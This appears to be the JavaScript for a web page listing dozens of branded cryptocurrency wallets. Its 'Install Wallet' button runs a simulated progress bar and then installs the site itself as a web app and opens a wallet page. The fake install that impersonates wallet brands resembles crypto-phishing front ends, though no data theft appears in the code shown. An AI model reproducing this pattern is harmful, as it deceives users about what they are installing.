console.log("Wallets page loaded!");

// Final clean wallet list (no duplicates)
const wallets = [
  "Meta Mask", "Poloniex", "Trust", "Solflare", "WalletConnect", "Terra",
  "Bitpay", "Maiar", "MyKey", "Atwallet", "Authereum", "Bitfrost", "Coinbase1",
  "Coinomi", "Dcent", "Easypocket", "Ledger", "Coolwallet", "Cybavowallet",
  "Coin98", "Harmony", "PeakDefi", "Gridplus", "VIA", "Imtoken", "Infinito",
  "Infinity", "Kadachain", "Keplr", "Midas1", "Marixwallet", "Midas2", "Nash",
  "Onto", "Ownbit", "Pillar", "Rainbow", "Safepal", "Sollet", "Spark",
  "Spatium", "Tokenary", "Tokenpocket", "Tomo", "Torus", "Coinbase2", "XDC",
  "Walletio", "Walleth", "Zelcore", "Phantom", "Exodus", "Binance", "Bitget",
  "Other Wallets"
];

const container = document.getElementById("walletContainer");

// Generate wallet cards
wallets.forEach((name) => {
  let imageName =
    name.toLowerCase()
      .replace(/\s+/g, "")
      .replace(/'/g, "")
      .replace(/\./g, "")
      .replace(/-/g, "")
      .replace(/\//g, "") + ".webp";

  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
      <div class="wallet-card">
        <p>${name}</p>

        <div class="icon-row">

          <div class="icon-btn download-btn" onclick="installWallet('${name}')">
              <img src="assets/icons/downloads.png">
              <span>Install Wallet</span>
          </div>

          <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
              <img src="assets/icons/rocket.png">
              <span>Open Wallet</span>
          </div>

          <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
              <img src="assets/icons/share.png">
              <span>Share</span>
          </div>

        </div>
      </div>
    `;
    return;
  }

  container.innerHTML += `
    <div class="wallet-card">
      <img src="wallet-icons/${imageName}" alt="${name}">
      <p>${name}</p>

      <div class="icon-row">

        <div class="icon-btn download-btn" onclick="installWallet('${name}')">
            <img src="assets/icons/downloads.png">
            <span>Install Wallet</span>
        </div>

        <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
            <img src="assets/icons/rocket.png">
            <span>Open Wallet</span>
        </div>

        <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
            <img src="assets/icons/share.png">
            <span>Share</span>
        </div>

      </div>
    </div>
  `;
});

// ------------------------------
// Open Wallet Page
// ------------------------------
function openWallet(walletName) {
  window.location.href = `wallet-page.html?wallet=${walletName}`;
}

// ------------------------------
// Share Wallet
// ------------------------------
function shareWallet(walletName) {
  if (navigator.share) {
    navigator.share({
      title: "Wallet",
      text: `Check this wallet: ${walletName}`,
      url: window.location.href
    }).catch((err) => console.log("Share cancelled", err));
  } else {
    alert("Sharing is not supported on this device.");
  }
}

// ------------------------------
// PWA INSTALL LOGIC
// ------------------------------
let deferredPrompt = null;

window.addEventListener("beforeinstallprompt", (e) => {
  e.preventDefault();
  deferredPrompt = e;
});

function closePopup() {
  document.getElementById("pwaPopup").style.display = "none";
}

// Main Install Function (Progress + Real Install)
function installWallet(walletName) {

  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    alert("This feature only works on mobile devices.");
    return;
  }

  let progress = 0;
  document.getElementById("pwaPopup").style.display = "flex";

  document.getElementById("progressText").innerText = "Installing… 0%";
  document.getElementById("progressFill").style.width = "0%";

  let interval = setInterval(async () => {
    progress++;
    document.getElementById("progressText").innerText = `Installing… ${progress}%`;
    document.getElementById("progressFill").style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(interval);

      document.getElementById("progressText").innerText = "Done!";
      document.getElementById("progressFill").style.width = "100%";

      setTimeout(async () => {

        // 🔥 REAL INSTALL DIALOG (IMPORTANT)
        if (deferredPrompt) {
          deferredPrompt.prompt();

          let choice = await deferredPrompt.userChoice;

          if (choice.outcome === "accepted") {
            console.log("User installed app");
          } else {
            console.log("User dismissed install");
          }

          deferredPrompt = null;
        }

        closePopup();
        openWallet(walletName);

      }, 700);
    }
  }, 40);
}

// Install Button (if used separately)
document.getElementById("installBtn").onclick = async () => {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    deferredPrompt = null;
  }
};
